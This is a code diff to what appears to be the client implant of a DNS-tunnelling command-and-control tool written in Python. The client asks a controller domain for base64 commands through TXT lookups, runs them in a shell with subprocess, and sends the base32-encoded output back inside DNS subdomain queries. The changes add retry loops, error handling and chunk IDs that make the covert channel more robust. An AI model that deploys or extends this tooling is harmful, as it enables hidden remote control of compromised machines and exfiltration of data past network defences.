@@ -70,7 +70,13 @@ def main():
             subd = b"CHK" + encode32(str(datetime.datetime.now())) # check in for commands
             if subd.endswith(b"-"): subd += b"0" # can't end a subdomain with "-"
             # answer = res.query(subd.decode('utf-8') + args.domain, "TXT")
-            answer = res.resolve(subd.decode('utf-8') + args.domain, "TXT")
+            asr = None
+            while not asr:
+                try:
+                    asr = answer = res.resolve(subd.decode('utf-8') + args.domain, "TXT")
+                except Exception as e:
+                    print(e)
+                    sleep(args.timeout)
             answer = answer[0].to_text().replace('"','') # avoid quotes in answer
             msgType = answer[:3]
             if debuggin: print(f"{OV}answer is {OR}{answer}{OV}, and it's {OR}{len(answer)}{OV} bytes long{OM}")
@@ -86,9 +92,15 @@ def main():
                 cmdPktCt = int(answer) # how many lines long is the command?
                 if debuggin: print(f"{OV}Command is {OR}{cmdPktCt}{OR} chunks long{OR}")
                 command64 = ""
+                cmdasr = None
                 for i in range(cmdPktCt): # get all lines
                     subd = b"CON" + encode32(str(datetime.datetime.now()))
-                    answer = res.resolve(subd.decode('utf-8') + args.domain, "TXT")
+                    while not cmdasr:
+                        try:
+                            cmdasr = answer = res.resolve(subd.decode('utf-8') + args.domain, "TXT")
+                        except Exception as e:
+                            print(e)
+                            sleep(args.timeout)
                     answer = answer[0].to_text().replace('"','') # avoid quotes in answer
                     msgType = answer[:3]
                     command64 += answer[3:]
@@ -97,9 +109,13 @@ def main():
                 if debuggin: print(f"{OV}Executing command64 {OR}{command64}{OV}", end="")
                 command = decode64(command64).decode('utf-8')
                 if debuggin: print(f"{OV} a.k.a. {OR}{command}{OM}")
-                output = subprocess.check_output(command, shell=True)
+                try:
+                    output = subprocess.check_output(command, shell=True)
+                except Exception as e:
+                    output = e
                 if debuggin: print(f"{OV}Command output: {OR}{output}{OM}")
                 codedOutput = encode32(output)
+                #print(codedOutput)
                 respPktCt = int(len(codedOutput) / 55) + 1 # number of packets to send response
                 subd = b"HDR" + encode32(str(respPktCt) + " " + str(datetime.datetime.now())) # tell how many packets of response are coming
                 answer = res.resolve(subd.decode('utf-8') + args.domain, "TXT")
@@ -111,14 +127,22 @@ def main():
                     error = f"Expected 'ACK' from server, got {msgType}"
                     print(OE + error + OM)
                     raise Exception(error)
+                chkID = 0
                 for chunk in chunks:
+                    answer = None
                     # subd = encode32("RES" + hex(i)[-2:] + chunk)
                     subd = b"RES" + chunk.encode('utf-8')
                     if subd.endswith(b"-"): subd += b"0" # can't start/end subdomain with "-"
                     # if subd.startswith(b"-"): subd = b"0" + subd
                     if debuggin: print(f"{OV}Chunk looks like {OR}{chunk}{OV}; there are {OR}{len(chunks)}{OV} chunks.{OM}")
                     if debuggin: print(f"{OV}subd looks like {OR}{subd}{OM}")
-                    answer = res.resolve(subd.decode('utf-8') + args.domain, "TXT")
+                    #print(subd.decode('utf-8')[3:])
+                    while not answer:
+                        try:
+                            answer = res.resolve(subd.decode('utf-8') + f".{chkID}" + args.domain, "TXT")
+                        except Exception as e:
+                            print(e)
+                            sleep(args.timeout)
                     answer = answer[0].to_text().replace('"','') # avoid quotes in answer
                     msgType = answer[:3]
                     # if decode64(answer[0].to_text())[:5] != "ACK" + hex(i)[-2:]:
@@ -126,11 +150,12 @@ def main():
                         error = f"Expected 'ACK' from server, got {decode64(answer[0].to_text())[:5]}"
                         print(OE + error + OM)
                         raise Exception(error)
+                    chkID += 1
     except KeyboardInterrupt:
         pass
     finally:
         pass
-    
+
     # answers = dns.resolver.query('dnspython.org', 'MX')
     # for rdata in answers:
     #     print('Host', rdata.exchange, 'has preference', rdata.preference)
